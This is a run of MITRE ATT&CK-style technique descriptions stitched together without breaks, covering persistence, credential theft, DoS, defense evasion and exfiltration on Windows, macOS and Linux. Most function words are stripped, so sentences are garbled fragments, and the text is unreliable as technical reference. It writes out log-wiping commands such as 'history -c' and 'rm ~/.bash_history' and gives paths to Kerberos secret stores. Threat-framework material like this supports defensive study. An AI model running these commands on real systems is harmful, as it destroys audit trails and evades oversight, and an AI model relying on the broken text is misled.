Adversaries utilize protocols, including browsing, transferring files, electronic mail, DNS. connections occur internally enclave (such proxy pivot node nodes), commonly protocols SMB, SSH, RDP.  Adversaries stage data collected multiple systems central location directory prior Exfiltration. Data separate files combined file techniques [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells used, common functionality [cmd](https://attack.mitre.org/software/S0106) bash data staging location.

In cloud environments, adversaries stage data instance virtual machine exfiltration. adversary [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) stage data instance.(Citation: Mandiant M-Trends 2020)

By staging data prior Exfiltration, adversaries minimize connections C2 server evade detection. Adversaries abuse task scheduling functionality facilitate initial recurring execution malicious code. Utilities exist major operating systems schedule programs scripts executed time. task scheduled remote system, proper authentication met (ex: RPC file printer sharing Windows environments). Scheduling task remote typically require admin privileged remote system.(Citation: TechNet Task Scheduler Security)

Adversaries task scheduling execute programs startup scheduled basis persistence. mechanisms abused process context account (such elevated permissions/privileges). [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries abused task scheduling mask one-time execution trusted process.(Citation: ProofPoint Serpent) Adversaries abuse msiexec.exe proxy execution malicious payloads. Msiexec.exe command-line utility Windows Installer commonly executing installation packages (.msi).(Citation: msiexec) Msiexec.exe binary digitally signed Microsoft.

Adversaries abuse msiexec.exe launch local network accessible MSI files. Msiexec.exe execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) signed native Windows systems, msiexec.exe bypass application control solutions account potential abuse. Msiexec.exe execution elevated privileges <code>AlwaysInstallElevated</code> policy enabled.(Citation: AlwaysInstallElevated 2018) MacOS option list specific applications user logs in. applications logged user's context, started time user logs in. Login items installed Service Management Framework visible Preferences removed application created (Citation: Adding Login Items). Users direct control login items installed shared file list visible Preferences (Citation: Adding Login Items). login items stored user's <code>~/Library/Preferences/</code> directory plist file called <code>com.apple.loginitems.plist</code> (Citation: Methods Mac Malware Persistence). applications visible dialogs user, don’t option ‘Hide’ window. adversary register login item modified existing one, execute code persistence mechanism time user logs (Citation: Malware Persistence OS X) (Citation: OSX.Dok Malware). API method <code> SMLoginItemSetEnabled </code> set Login Items, scripting languages [AppleScript](https://attack.mitre.org/techniques/T1155)  (Citation: Adding Login Items). Adversaries gather victim's network trust dependencies targeting. network trusts include variety details, including third-party organizations/domains (ex: managed service providers, contractors, etc.) connected (and elevated) network access.

Adversaries gather ways, direct elicitation [Phishing Information](https://attack.mitre.org/techniques/T1598). network trusts exposed adversaries online accessible data sets (ex: [Search Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting Forests) Gathering reveal opportunities forms reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)). Adversaries attempt denial service (DoS) reflecting high-volume network traffic target. type Network DoS takes advantage third-party server intermediary hosts respond spoofed source IP address. third-party server commonly termed reflector. adversary accomplishes reflection attack sending packets reflectors spoofed address victim. Direct Network Floods, conduct attack, botnet used. Likewise, reflectors focus traffic target.(Citation: Cloudflare ReflectionDoS 2017) Network DoS attack reduce availability functionality targeted system(s) network.

Reflection attacks advantage protocols larger responses requests amplify traffic, commonly Reflection Amplification attack. Adversaries generate increase volume attack traffic magnitude requests amplifiers. extent increase depending variables, protocol question, technique used, amplifying servers produce amplification attack volume. prominent protocols enabled Reflection Amplification Floods DNS(Citation: Cloudflare DNSamplficationDoS) NTP(Citation: Cloudflare NTPamplifciationDoS), wild documented.(Citation: Arbor AnnualDoSreport Jan 2018)  particular, memcache protocol powerful protocol, amplification sizes 51,200 times requesting packet.(Citation: Cloudflare Memcrashed Feb 2018) Adversaries register malicious password filter dynamic link libraries (DLLs) authentication process acquire user credentials validated. 

Windows password filters password policy enforcement mechanisms domain local accounts. Filters implemented DLLs method validate potential passwords password policies. Filter DLLs positioned local computers local accounts domain controllers domain accounts. registering passwords Security Accounts Manager (SAM), Local Security Authority (LSA) requests validation registered filter. potential registered filter acknowledges validation. 

Adversaries register malicious password filters harvest credentials local computers entire domains. perform proper validation, filters receive plain-text credentials LSA. malicious password filter receive plain-text credentials time password request made.(Citation: Carnal Ownage Password Filters Sept 2013) Adversaries abuse components Terminal Services enable persistent access systems. Terminal Services, renamed Remote Desktop Services Windows Server OSs 2022, enable remote terminal connections hosts. Terminal Services servers transmit full, interactive, graphical user interface clients RDP.(Citation: Remote Desktop Services)

[Windows Service](https://attack.mitre.org/techniques/T1543/003)s "generic" process (ex: <code>svchost.exe</code>) load service's DLL file, location stored Registry entry named <code>ServiceDll</code>.(Citation: Services Fundamentals) <code>termsrv.dll</code> file, typically stored `%SystemRoot%\System32\`, default <code>ServiceDll</code> Terminal Services `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.

Adversaries modify replace Terminal Services DLL enable persistent access victimized hosts.(Citation: James TermServ DLL) Modifications DLL execute arbitrary payloads (while preserving normal <code>termsrv.dll</code> functionality) simply enable abusable features Terminal Services. example, adversary enable features concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions patching <code>termsrv.dll</code> file modifying <code>ServiceDll</code> DLL increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) non-server Windows OS increased functionality enable adversary avoid Terminal Services prompts warn/log users RDP session created. Adversaries abuse AppleScript execution. AppleScript macOS scripting language designed control applications OS inter-application messages called AppleEvents.(Citation: Apple AppleScript) AppleEvent messages independently easily scripted AppleScript. events locate windows, send keystrokes, interact application locally remotely.

Scripts command-line <code>osascript /path/to/script</code> <code>osascript -e "script here"</code>. command line, scripts executed numerous including Mail rules, Calendar.app alarms, Automator workflows. AppleScripts executed plain scripts adding <code>#!/usr/bin/osascript</code> start script file.(Citation: SentinelOne AppleScript)

AppleScripts <code>osascript</code> execute. However, executed mach-O binaries macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, execute code independent <code>/usr/bin/osascript</code> command utility.

Adversaries abuse AppleScript execute behaviors, interacting SSH connection, moving remote machines, users fake dialog boxes. events start applications remotely (they start locally), interact applications running remotely. macOS 10.10 Yosemite higher, AppleScript ability execute [Native API](https://attack.mitre.org/techniques/T1106)s, require compilation execution mach-O binary file format.(Citation: SentinelOne macOS Red Team) scripting language, launch common techniques reverse [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs) Adversaries abuse Internet browser extensions establish persistent access victim systems. Browser extensions plugins programs add functionality customize aspects Internet browsers. installed browser's app store access permissions browser access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)

Malicious extensions installed browser malicious app store downloads masquerading legitimate extensions, social engineering, adversary compromised system. Security limited browser app stores difficult malicious extensions defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending browser, adversaries manipulate extension's update url install updates adversary controlled server manipulate mobile configuration file silently install additional extensions.

Previous macOS 11, adversaries silently install browser extensions command <code>profiles</code> tool install malicious <code>.mobileconfig</code> files. macOS 11+, <code>profiles</code> tool install configuration profiles, <code>.mobileconfig</code> files planted installed user interaction.(Citation: xorrior chrome extensions macOS)

Once extension installed, browse websites background, steal user enters browser (including credentials), installer RAT persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch Chrome Extension)

There instances botnets persistent backdoor malicious Chrome extensions.(Citation: Stantinko Botnet) examples extensions command & control.(Citation: Chrome Extension C2 Malware) Adversaries target network services systems conduct denial service (DoS). Adversaries target availability DNS services, targeted well.(Citation: Arbor AnnualDoSreport Jan 2018) server software attacked variety means, apply specific software provide service.

One type attack simple flood, adversary sends requests server overwhelm application runs it. flood relies raw volume accomplish objective, exhausting resources required victim software provide service.(Citation: Cloudflare HTTPflood)

Another variation, SSL renegotiation attack, takes advantage protocol feature SSL/TLS. SSL/TLS protocol suite includes mechanisms client server agree encryption algorithm subsequent secure connections. SSL renegotiation enabled, request renegotiation crypto algorithm. renegotiation attack, adversary establishes SSL/TLS connection proceeds series renegotiation requests. cryptographic renegotiation meaningful cost computation cycles, impact availability service volume.(Citation: Arbor SSLDoS April 2012) Adversaries manipulate hardware components products prior receipt final consumer purpose data compromise. modifying hardware firmware supply chain, adversaries insert backdoor consumer networks difficult detect adversary degree control system. Hardware backdoors inserted devices, servers, workstations, network infrastructure, peripherals. Adversaries interact native OS application programming interface (API) execute behaviors. Native APIs provide controlled calling low-level OS services kernel, involving hardware/devices, memory, processes.(Citation: NT API Windows)(Citation: Linux Kernel API) native APIs leveraged OS boot (when components initialized) carrying tasks requests routine operations.

Native API functions (such <code>NtCreateProcess</code>) directed invoked calls / syscalls, features exposed user-mode applications interfaces libraries.(Citation: OutFlank Calls)(Citation: CyberBit Calls)(Citation: MDSec Calls) example, functions Windows API <code>CreateProcess()</code> GNU <code>fork()</code> programs scripts start processes.(Citation: CreateProcess)(Citation: GNU Fork) API callers execute binary, CLI command, load modules, etc. thousands API functions exist operations.(Citation: Win32)(Citation: LIBC)(Citation: GLIBC)

Higher level software frameworks, .NET macOS Cocoa, interact native APIs. frameworks typically provide language wrappers/abstractions API functionalities designed ease-of-use/portability code.(Citation: NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)

Adversaries abuse OS API functions executing behaviors. [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059), native API hierarchy interfaces provide mechanisms interact utilize components victimized system. invoking API functions, adversaries attempt bypass defensive tools (ex: unhooking monitored functions [Disable Modify Tools](https://attack.mitre.org/techniques/T1562/001)). Adversaries remove evidence malicious network connections clean traces operations. Configuration settings artifacts highlight connection history created behaviors require network connections, [Remote Services](https://attack.mitre.org/techniques/T1021) [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders artifacts monitor analyze network connections created adversaries.

Network connection history stored locations system. example, RDP connection history stored Windows Registry values (Citation: RDP Removal):

* <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code>

Windows store RDP connections files <code>C:\Users\\%username%\Documents\Default.rdp</code> `C:\Users\%username%\AppData\Local\Microsoft\Terminal
Server Client\Cache\`.(Citation: Moran RDPieces) Similarly, macOS Linux hosts store highlighting connection history logs (such stored `/Library/Logs` `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login Screen Sharing)

Malicious network connections require network configuration settings, [Disable Modify Firewall](https://attack.mitre.org/techniques/T1562/004) tampering enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries delete modify data conceal indicators impede defensive analysis. Adversaries reveal credentials accounts disabled Kerberos preauthentication [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) 

Preauthentication offers protection offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). enabled, user requesting access resource initiates communication Domain Controller (DC) sending Authentication Server Request (AS-REQ) message timestamp encrypted hash password. DC decrypt timestamp hash user’s password, send Authentication Server Response (AS-REP) message Ticket Granting Ticket (TGT) user. AS-REP message signed user’s password.(Citation: Kerberos Preauth 2014)

For account preauthentication, adversary send AS-REQ message encrypted timestamp receive AS-REP message TGT data encrypted insecure algorithm RC4. recovered encrypted data vulnerable offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) 

An account registered domain, special privileges, abused list domain accounts preauthentication disabled utilizing Windows tools [PowerShell](https://attack.mitre.org/techniques/T1059/001) LDAP filter. Alternatively, adversary send AS-REQ message user. DC responds errors, account require preauthentication AS-REP message encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)

Cracked hashes enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), [Lateral Movement](https://attack.mitre.org/tactics/TA0008) access [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014) Windows stores local service configuration Registry <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. stored service's Registry manipulated modify service's execution parameters tools service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), [Reg](https://attack.mitre.org/software/S0075). Access Registry controlled Access Control Lists permissions. (Citation: MSDN Registry Key Security)

If permissions users properly set access Registry service, adversaries change service binPath/ImagePath executable control. service starts restarted, adversary-controlled program execute, allowing adversary gain persistence privilege escalation account context service set execute (local/domain account, SYSTEM, LocalService, NetworkService).

Adversaries alter Registry service failure parameters (such <code>FailureCommand</code>) executed elevated context anytime service fails intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017) Adversaries compromise third-party Virtual Private Servers (VPSs) targeting. exist variety cloud service providers sell virtual machines/containers service. Adversaries compromise VPSs purchased third-party entities. compromising VPS infrastructure, adversaries difficult physically tie operations themselves.(Citation: NSA NCSC Turla OilRig)

Compromising VPS stages adversary lifecycle, Command Control, adversaries benefit ubiquity trust reputation cloud service providers compromised third-party. Adversaries reduce level effort required decrypt data transmitted network reducing cipher strength encrypted communications.(Citation: Cisco Synful Knock Evolution)

Adversaries weaken encryption software compromised network device reducing key size software convert plaintext ciphertext hundreds thousands bytes couple bytes). result, adversaries dramatically reduce effort decrypt protected key.

Adversaries modify key size encryption parameters specialized commands [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced [Modify Image](https://attack.mitre.org/techniques/T1601) change configuration device. (Citation: Cisco Blog Legacy Device Attacks) addition clearing logs, adversary command history compromised account conceal actions undertaken intrusion. command interpreters track commands users type terminal users retrace done.

On Linux macOS, command histories accessed ways. logged in, command history tracked file environment variable <code>HISTFILE</code>. user logs system, flushed file user's directory called <code>~/.bash_history</code>. benefit users commands sessions.

Adversaries delete commands logs manually clearing history (<code>history -c</code>) deleting bash history file <code>rm ~/.bash_history</code>.  

Adversaries leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) network devices command history data (<code>clear logging</code> <code>clear history</code>).(Citation: US-CERT-TA18-106A)

On Windows hosts, PowerShell command history providers: built-in history command history managed <code>PSReadLine</code> module. built-in history tracks commands current session. command history sessions deleted session ends.

The <code>PSReadLine</code> command history tracks commands PowerShell sessions writes file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> default). history file sessions history file deleted session ends.(Citation: PowerShell Command History)

Adversaries PowerShell command <code>Clear-History</code> flush entire command history current PowerShell session. This, however, delete/flush <code>ConsoleHost_history.txt</code> file. Adversaries delete <code>ConsoleHost_history.txt</code> file edit contents hide PowerShell commands run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics) Adversaries abuse utilities command execution bypass security restrictions limit command-line interpreters. Windows utilities execute commands, invoking [cmd](https://attack.mitre.org/software/S0106). example, [Forfiles](https://attack.mitre.org/software/S0193), Program Compatibility Assistant (pcalua.exe), components Windows Subsystem Linux (WSL), utilities invoke execution programs commands [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059), window, scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)

Adversaries abuse features [Defense Evasion](https://attack.mitre.org/tactics/TA0005), perform arbitrary execution subverting detections mitigation controls (such Policy) limit/prevent usage [cmd](https://attack.mitre.org/software/S0106) file extensions commonly malicious payloads. Adversaries custom cryptographic protocol algorithm hide command control traffic. simple scheme, XOR-ing plaintext fixed key, produce weak ciphertext.

Custom encryption schemes vary sophistication. Analysis reverse engineering malware samples discover algorithm encryption key used.

Some adversaries attempt implement version well-known cryptographic algorithm implementation library, lead unintentional errors. (Citation: F-Secure Cosmicduke) adversary revert cloud instance performed malicious activities attempt evade detection remove evidence presence. highly virtualized environments, cloud-based infrastructure, accomplished restoring virtual machine (VM) data storage snapshots cloud management dashboard cloud APIs.

Another variation technique utilize temporary storage attached compute instance. cloud providers provide types storage including persistent, local, ephemeral, ephemeral types reset stop/restart VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot) Adversaries systems, disconnected air-gapped networks, copying malware removable media advantage Autorun features media inserted executes. Lateral Movement, occur modification executable files stored removable media copying malware renaming legitimate file trick users executing separate system. Initial Access, occur manual manipulation media, modification systems initially format media, modification media's firmware itself.

Mobile devices infect PCs malware connected USB.(Citation: Exploiting Smartphone USB ) infection achieved devices (Android, iOS, etc.) and, instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) example, smartphone connected system, mounted USB-connected disk drive. malware compatible connected mobile device, malware infect machine (especially Autorun features enabled). Adversaries search local sources, file systems configuration files local databases, files sensitive data prior Exfiltration.

Adversaries [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059), [cmd](https://attack.mitre.org/software/S0106) [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), functionality interact file gather information. Adversaries [Automated Collection](https://attack.mitre.org/techniques/T1119) local system.
 Adversaries [Obfuscated Files Information](https://attack.mitre.org/techniques/T1027) hide artifacts intrusion analysis. require separate mechanisms decode deobfuscate depending intend it. Methods include built-in functionality malware utilities system.

One [certutil](https://attack.mitre.org/software/S0160) decode remote access tool portable executable file hidden certificate file. (Citation: Malwarebytes Targeted Attack Saudi Arabia) Windows <code>copy /b</code> command reassemble binary fragments malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)

Sometimes user's action required deobfuscation decryption [User Execution](https://attack.mitre.org/techniques/T1204). user required input password password protected compressed/encrypted file adversary. (Citation: Volexity PowerDuke November 2016) Adversaries abuse Outlook rules persistence compromised system. Outlook rules user define automated behavior manage email messages. benign rule might, example, automatically email folder Outlook specific specific sender. Malicious Outlook rules created trigger code execution adversary sends crafted email user.(Citation: SilentBreak Outlook Rules)

Once malicious rules user’s mailbox, loaded Outlook started. Malicious rules execute adversary sends crafted email user.(Citation: SilentBreak Outlook Rules) Adversaries maliciously modify components victim environment hinder disable defensive mechanisms. involves impairing preventative defenses, firewalls anti-virus, detection capabilities defenders audit activity identify malicious behavior. span native defenses supplemental capabilities installed users administrators.

Adversaries target event aggregation analysis mechanisms, disrupt procedures altering components. Adversaries compromise cloud accounts targeting. Adversaries compromised cloud accounts operations, including leveraging cloud storage services Dropbox, OneDrive, AWS S3 buckets [Exfiltration Cloud Storage](https://attack.mitre.org/techniques/T1567/002) [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts acquisition infrastructure, [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Compromising cloud accounts adversaries develop sophisticated capabilities managing servers.(Citation: Awake Security C2 Cloud)

A variety methods exist compromising cloud accounts, gathering credentials [Phishing Information](https://attack.mitre.org/techniques/T1598), purchasing credentials third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, attempting [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior compromising cloud accounts, adversaries conduct Reconnaissance inform decisions accounts compromise operation. cases, adversaries target privileged service provider accounts intent leveraging [Trusted Relationship](https://attack.mitre.org/techniques/T1199) service providers customers.(Citation: MSTIC Nobelium Oct 2021) Adversaries compromise email accounts targeting. Adversaries compromised email accounts operations, leveraging conduct [Phishing Information](https://attack.mitre.org/techniques/T1598) [Phishing](https://attack.mitre.org/techniques/T1566). Utilizing existing persona compromised email account engender level trust potential victim relationship, knowledge of, compromised persona. Compromised email accounts acquisition infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).

A variety methods exist compromising email accounts, gathering credentials [Phishing Information](https://attack.mitre.org/techniques/T1598), purchasing credentials third-party sites, brute forcing credentials (ex: password reuse breach credential dumps).(Citation: AnonHBGary) Prior compromising email accounts, adversaries conduct Reconnaissance inform decisions accounts compromise operation.

Adversaries compromised email account hijack existing email threads targets interest. Adversaries upload malware third-party adversary controlled infrastructure accessible targeting. Malicious software include payloads, droppers, post-compromise tools, backdoors, variety malicious content. Adversaries upload malware support operations, payload victim network enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) placing Internet accessible server.

Malware infrastructure purchased/rented adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware staged services, GitHub Pastebin.(Citation: Volexity Ocean Lotus November 2020)

Adversaries upload backdoored files, application binaries, virtual machine images, container images, third-party software stores repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). chance encounter, victims download/install backdoored files [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) increase chance users mistakenly executing files. Adversaries manipulate products product delivery mechanisms prior receipt final consumer purpose data compromise.

Supply chain compromise stage supply chain including:

* Manipulation development tools
* Manipulation development environment
* Manipulation source code repositories (public private)
* Manipulation source code open-source dependencies
* Manipulation software update/distribution mechanisms
* Compromised/infected images (multiple removable media infected factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) 
* Replacement legitimate software modified versions
* Sales modified/counterfeit products legitimate distributors
* Shipment interdiction

While supply chain compromise impact component hardware software, adversaries gain execution focused malicious additions legitimate software software distribution update channels.(Citation: Avast CCleaner3 2018)(Citation: Dofoil 2018)(Citation: Command 2011) Targeting specific desired victim set malicious software distributed broad set consumers additional tactics specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command 2011) Popular source projects dependencies applications targeted add malicious code users dependency.(Citation: Trendmicro NPM Compromise) Adversaries attempt advantage weakness Internet-facing program software, data, commands unintended unanticipated behavior. weakness bug, glitch, design vulnerability. applications websites, include databases (like SQL), standard services (like SMB SSH), network device administration management protocols (like SNMP Smart Install), applications Internet accessible sockets, servers services.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending flaw exploited include [Exploitation Defense Evasion](https://attack.mitre.org/techniques/T1211). 

If application hosted cloud-based infrastructure containerized, exploiting lead compromise underlying instance container. adversary path access cloud container APIs, exploit container host access [Escape Host](https://attack.mitre.org/techniques/T1611), advantage weak identity access management policies.

For websites databases, OWASP CWE 25 highlight common web-based vulnerabilities.(Citation: OWASP 10)(Citation: CWE 25) Adversaries attempt subvert Kerberos authentication stealing forging Kerberos tickets enable [Pass Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos authentication protocol modern Windows domain environments. Kerberos environments, referred “realms”, basic participants: client, service, Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Decoder) Clients request access service exchange Kerberos tickets, originating KDC, granted access authenticated. KDC responsible authentication ticket granting.  Adversaries attempt abuse Kerberos stealing tickets forging tickets enable unauthorized access.

On Windows, built-in <code>klist</code> utility list analyze cached Kerberos tickets.(Citation: Klist)

Linux systems Active Directory domains store Kerberos credentials locally credential cache file referred "ccache". credentials stored ccache file remain valid user's session lasts.(Citation: MIT ccache) modern Redhat Enterprise Linux systems, derivative distributions, Security Services Daemon (SSSD) handles Kerberos tickets. default SSSD maintains ticket database <code>/var/lib/sss/secrets/secrets.ldb</code> key located <code>/var/lib/sss/secrets/.secrets.mkey</code>. files require root access read. adversary access database key, credential cache Kerberos blob extracted converted usable Kerberos ccache file adversaries [Pass Ticket](https://attack.mitre.org/techniques/T1550/003). ccache file converted Windows format tools Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz Unix)(Citation: Kekeo)


Kerberos tickets macOS stored standard ccache format, Linux. default, access ccache entries federated KCM daemon process Mach RPC protocol, caller's environment determine access. storage location ccache entries influenced <code>/etc/krb5.conf</code> configuration file <code>KRB5CCNAME</code> environment variable save disk protected KCM daemon. Users interact ticket storage <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, <code>kcc</code> built-in binaries Apple's native Kerberos framework. Adversaries source tools interact ccache files Kerberos framework lower-level APIs extracting user's TGT Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)
 Adversaries search common password storage locations user credentials. Passwords stored system, depending operating application holding credentials. specific applications store passwords easier users manage maintain. credentials obtained, perform lateral movement access restricted information. Adversaries existing, legitimate external service exfiltrate data primary command control channel. Popular services acting exfiltration mechanism cover likelihood hosts network communicating prior compromise. Firewall rules exist permit traffic services.

Web service providers commonly SSL/TLS encryption, adversaries level protection. adversary legitimate desktop support remote access software, Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, establish interactive command control channel target systems networks. services commonly legitimate technical support software, allowed application control target environment. Remote access tools VNC, Ammyy, Teamviewer frequently compared legitimate software commonly adversaries.(Citation: Symantec Living Land)

Remote access tools installed post-compromise alternate communications channel redundant access establish interactive remote desktop session target system. component malware establish reverse connection back-connect service adversary controlled system. Installation remote access tools include persistence (ex: tool's installation routine creates [Windows Service](https://attack.mitre.org/techniques/T1543/003)).

Admin tools TeamViewer targeting institutions countries Russian criminal campaigns.(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries acquire domains targeting. Domain names human readable names represent IP addresses. purchased or, cases, acquired free.

Adversaries acquired domains variety purposes, including [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), Command Control.(Citation: CISA MSS Sep 2020) Adversaries choose domains legitimate domains, including homoglyphs top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting aid delivery payloads [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries internationalized domain names (IDNs) character sets (e.g. Cyrillic, Greek, etc.) execute "IDN homograph attacks," creating visually lookalike domains deliver malware victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)

Adversaries acquire repurpose expired domains, allowlisted/trusted defenders based existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)

Domain registrars maintain publicly viewable database displays contact registered domain. Private WHOIS services display alternative information, company data, owner domain. Adversaries private WHOIS services obscure owns purchased domain. Adversaries interrupt efforts track infrastructure varied registration purchasing domains domain registrars.(Citation: Mandiant APT1) adversary compress encrypt data collected prior exfiltration 3rd party libraries. libraries exist archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), zlib (Citation: Zlib Github). libraries include functionality encrypt compress data.

Some archival libraries preinstalled systems, bzip2 macOS Linux, zip Windows. Note libraries utilities. libraries linked compiling, utilities require spawning subshell, execution mechanism. Adversaries inject malicious code hijacked processes evade process-based defenses elevate privileges. Thread Execution Hijacking method executing arbitrary code address space separate live process. 

Thread Execution Hijacking commonly performed suspending existing process unmapping/hollowing memory, replaced malicious code path DLL. handle existing victim process created native Windows API calls <code>OpenThread</code>. process suspended written to, realigned injected code, resumed <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)

This [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) targets existing process creating process suspended state.  

Running code context process access process's memory, system/network resources, elevated privileges. Execution Thread Execution Hijacking evade detection security products execution masked legitimate process.  adversary performs C2 communications multiple layers encryption, typically (but exclusively) tunneling custom encryption scheme protocol encryption scheme HTTPS SMTPS. Adversaries attempt manipulate features artifacts legitimate benign users security tools. Masquerading occurs location object, legitimate malicious, manipulated abused sake evading defenses observation. include manipulating file metadata, tricking users misidentifying file type, legitimate task service names.

Renaming abusable utilities evade security monitoring form [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site) Adversaries establish persistence elevate privileges executing malicious content triggered application shims. Windows Application Compatibility Infrastructure/Framework (Application Shim) created compatibility software operating codebase time. example, application shimming feature developers apply fixes applications (without rewriting code) created Windows XP Windows 10. (Citation: Elastic Process Injection July 2017)

Within framework, shims created buffer program (or specifically, Import Address Table) Windows OS. program executed, shim cache referenced determine program requires shim database (.sdb). so, shim database hooking redirect code communicate OS. 

A list shims installed default Windows installer (sdbinst.exe) in:

* <code>%WINDIR%\AppPatch\sysmain.sdb</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>

Custom databases stored in:

* <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>

To shims secure, Windows designed user mode modify kernel administrator privileges install shim. However, shims [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC RedirectEXE), inject DLLs processes (InjectDLL), disable Data Execution Prevention (DisableNX) Structure Exception Handling (DisableSEH), intercept memory addresses (GetProcAddress).

